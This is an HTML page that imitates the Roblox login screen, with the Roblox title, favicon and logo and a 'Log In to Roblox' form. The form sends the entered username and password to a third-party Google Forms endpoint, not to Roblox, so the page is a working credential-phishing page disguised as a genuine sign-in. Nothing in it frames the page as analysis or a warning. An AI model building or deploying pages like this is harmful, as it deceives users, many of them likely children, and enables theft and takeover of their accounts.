<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Roblox</title>
  <link rel="icon" href="https://www.roblox.com/favicon.ico" />
  <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;700&display=swap" rel="stylesheet" />
  <style>
    body {
      margin: 0;
      font-family: 'Source Sans Pro', sans-serif;
      background-color: #1f1f1f;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background-color: #fff;
      padding: 30px 40px;
      border-radius: 8px;
      box-shadow: 0 0 12px rgba(0,0,0,0.3);
      width: 360px;
    }
    .logo {
      display: block;
      margin: 0 auto 20px;
      width: 160px;
    }
    h2 {
      text-align: center;
      color: #393b3d;
      margin-bottom: 20px;
      font-weight: 700;
      font-size: 20px;
    }
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 1px solid #d6d6d6;
      border-radius: 4px;
      font-size: 14px;
      box-sizing: border-box;
    }
    input[type="submit"] {
      width: 100%;
      padding: 12px;
      background-color: #0074bd;
      border: none;
      color: #fff;
      font-weight: bold;
      font-size: 15px;
      border-radius: 4px;
      margin-top: 15px;
      cursor: pointer;
    }
    input[type="submit"]:hover {
      background-color: #005fa3;
    }
    .footer {
      font-size: 12px;
      color: #aaa;
      margin-top: 20px;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Roblox_Logo_2022.svg" alt="Roblox Logo" />
    <h2>Log In to Roblox</h2>
    <form 
      action="https://docs.google.com/forms/d/e/1FAIpQLSdc3k2ZcT6aW2BzHMToz8zLJZ1qNfbXhxZlaer1rtnwajPwVw/formResponse" 
      method="POST" 
      target="_self"
    >
      <input type="text" name="entry.167484173" placeholder="Username" required />
      <input type="password" name="entry.1874978695" placeholder="Password" required />
      <input type="submit" value="Log In" />
    </form>
    <div class="footer">
    </div>
  </div>
</body>
</html>
